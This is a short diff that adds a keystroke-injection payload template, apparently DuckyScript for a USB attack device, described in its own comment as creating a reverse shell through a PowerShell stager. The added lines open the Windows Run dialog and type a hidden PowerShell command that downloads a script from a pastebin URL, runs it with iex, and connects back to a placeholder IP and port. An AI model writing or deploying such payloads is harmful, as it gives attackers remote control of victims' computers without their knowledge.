@@ -1,0 +1,6 @@
+REM Creates a reverse shell using a powershell stager
+DELAY {start_delay}
+GUI r
+DELAY 350
+STRING cmd /c start /min powershell -w 1 "irm https://pastebin.com/raw/Ytikm5KS|iex;s '{ip}' {port}"
+{windows_admin}
